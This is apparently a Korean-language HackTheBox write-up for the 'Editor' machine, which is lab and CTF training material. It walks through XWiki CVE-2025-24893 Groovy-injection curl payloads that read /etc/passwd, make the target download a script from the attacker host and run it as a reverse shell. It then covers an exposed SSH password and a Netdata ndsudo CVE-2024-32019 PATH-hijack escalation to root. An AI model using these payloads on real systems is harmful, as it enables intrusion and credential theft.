# Editor - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,8080 -sC -sV -vv -oA editor 10.10.11.80
```
<img width="1105" height="392" alt="image" src="https://github.com/user-attachments/assets/815eaac0-c373-47c0-aa42-3fcca31408ab" />

- SSH(22)
- HTTP(80)
- HTTP(8080)

---
## HTTP(8080)
### banner grabbing
```bash
whatweb http://10.10.11.80:8080
```
<img width="1105" height="127" alt="image" src="https://github.com/user-attachments/assets/7d9e1ae0-c699-4133-b82d-e060490bf4d2" />

<br>
<br>

```bash
curl -IL http://10.10.11.80:8080
```
<img width="1105" height="555" alt="image" src="https://github.com/user-attachments/assets/7b6d4c57-34c7-4b57-b84e-f36478b6abf5" />

### CVE-2025-24893
- `XWiki Debian 15.10.8`
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/5e3c40a7-da25-4b28-bb5b-bc86928782eb" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2025-24893
- `SolrSearch` 경로에서 임의의 코드 실행 취약점.
<img width="1100" height="324" alt="image" src="https://github.com/user-attachments/assets/49593ca8-b05d-479d-80aa-f30b053ed802" />

<br>
<br>

- https://www.exploit-db.com/exploits/52136
- 서버 경로의 시작점이 `/xwiki`라서 해당 경로를 포함해서 exploit을 시도.
<img width="1100" height="32" alt="image" src="https://github.com/user-attachments/assets/4b4639d3-fc35-4a8c-bf53-7177f19b3371" />

<br>
<br>

- `/etc/passwd`출력 시도.
```bash
curl 'http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
```
<img width="1106" height="164" alt="image" src="https://github.com/user-attachments/assets/dad9c88d-da54-47f6-86b4-980e0886a0e5" />

<br>
<br>

- ping test 시도.
```bash
curl 'http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22ping%2010.10.16.4%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
```
<img width="1106" height="95" alt="image" src="https://github.com/user-attachments/assets/dd94eb95-1b0d-47b2-b4a3-13cde9a0021a" />

<br>
<br>

- ping test 성공.
<img width="1106" height="236" alt="image" src="https://github.com/user-attachments/assets/b19c1729-19f9-48fb-80b8-9b232c02c280" />

<br>
<br>

- `ex.sh` 로컬에 생성.
<img width="1106" height="101" alt="image" src="https://github.com/user-attachments/assets/de115a2b-e5a6-4dff-af79-a31086c07b41" />

<br>
<br>

- 로컬로부터 다운로드.
```bash
curl 'http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22wget%20http%3A%2F%2F10.10.16.4%2Fex.sh%20-O%20%2Ftmp%2Fex.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
```
<img width="1106" height="368" alt="image" src="https://github.com/user-attachments/assets/160576ea-007a-4ab6-a735-e6a335394067" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22%2Fbin%2Fbash%20%2Ftmp%2Fex.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
```
<img width="1106" height="89" alt="image" src="https://github.com/user-attachments/assets/90bcd813-28c4-42c3-b10f-6ad4b917f857" />

<br>
<br>

- 셸 획득.
<img width="1106" height="180" alt="image" src="https://github.com/user-attachments/assets/d00817c4-1765-4a01-b52b-524768431a8e" />

## Privesc
- `xwiki`의 홈 디렉토리는 `/var/lib/wiki`인데, 여기서는 특별한 정보를 찾을 수 없었음.
- `xwiki config file location`을 구글에 검색하여 `/etc/xwiki`를 확인.
- https://www.xwiki.org/xwiki/bin/view/ReleaseNotes/Data/XWiki/9.3RC1/Change010/
<img width="1100" height="179" alt="image" src="https://github.com/user-attachments/assets/4ea3cccc-41ee-42b3-9c79-8ec0412f8e04" />

<br>
<br>

- `hibernate.cfg.xml`파일에서 DB 계정 노출.
- `mysql`에서는 특별한 정보를 찾지못함.
<img width="1106" height="135" alt="image" src="https://github.com/user-attachments/assets/726faf97-a763-43c8-bf6a-1bbafb315b95" />

<br>
<br>

- `/etc/passwd`에서 `oliver`발견.
<img width="1106" height="60" alt="image" src="https://github.com/user-attachments/assets/56fe94cd-1313-4d44-b9c1-1feadcc1e0c9" />

<br>
<br>

- `oliver`로 로그인을 시도하였으나 실패.
- `SSH` 로그인 성공.(oliver:theEd1t0rTeam99)
```bash
ssh oliver@10.10.11.80
```
<img width="1106" height="45" alt="image" src="https://github.com/user-attachments/assets/302be9d2-0c38-4392-92e7-eea992021b6d" />

### CVE-2024-32019
- 19999포트가 열려있어 확인.
```bash
ss -tnlp

curl http://127.0.0.1:19999
```
<img width="1106" height="381" alt="image" src="https://github.com/user-attachments/assets/371c8617-2b72-4708-8dab-9cb526ca3043" />

<br>
<br>

- `SSH`로 19999 포트포워딩.
```bash
ssh -L 19999:localhost:19999 oliver@10.10.11.80
```
<img width="1106" height="95" alt="image" src="https://github.com/user-attachments/assets/ecc3f5e9-adec-4ea2-b26b-52aeca314f9e" />

<br>
<br>

- banner grabbing
```bash
whatweb http://127.0.0.1:19999

curl -IL http://127.0.0.1:19999
```
<img width="1106" height="396" alt="image" src="https://github.com/user-attachments/assets/d7692895-f133-4fb9-a82f-fb76155e3b7f" />

<br>
<br>

- 버전 확인.(Netdata 1.45.2)
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/787c68c1-c03e-4669-aeeb-095982b0b377" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2024-32019
- `root`권한의 set uid가 설정되어 있는 `ndsudo`의 취약점.
<img width="1100" height="536" alt="image" src="https://github.com/user-attachments/assets/bb04283e-d77c-46fe-b2bd-680cf5fa202e" />

<br>
<br>

- `ndsudo`에 set uid 설정 확인.
```bash
find / -perm -4000 2>/dev/null
```
<img width="1105" height="159" alt="image" src="https://github.com/user-attachments/assets/c4b0715e-f220-4684-8669-39542ce04ef3" />

<br>
<br>

- https://github.com/AliElKhatteb/CVE-2024-32019-POC
- IP와 PORT를 바꾼 후 `expolit.c` 컴파일.
```bash
x86_64-linux-gnu-gcc -o nvme exploit.c -static
```
<img width="1105" height="291" alt="image" src="https://github.com/user-attachments/assets/6ec552db-ce5f-40ce-921a-28b1d753a5e2" />

<br>
<br>

- `PATH`조작해서 리버스 셸 실행.
```bash
chmod +x nvme

PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
<img width="1105" height="50" alt="image" src="https://github.com/user-attachments/assets/458aba95-4d4d-4fb0-8f97-2528e2a469d6" />

<br>
<br>

- `root` 획득.
<img width="1105" height="158" alt="image" src="https://github.com/user-attachments/assets/16c05943-e3f3-4725-b19e-8127bc790ecc" />

---
## FLAG
- `/home/oliver/user.txt`
<img width="1105" height="215" alt="image" src="https://github.com/user-attachments/assets/37607205-119a-4a8b-bbe0-d4954bc9e6b9" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="289" alt="image" src="https://github.com/user-attachments/assets/37fbcc07-9edc-4235-8c16-72e902aa6076" />
















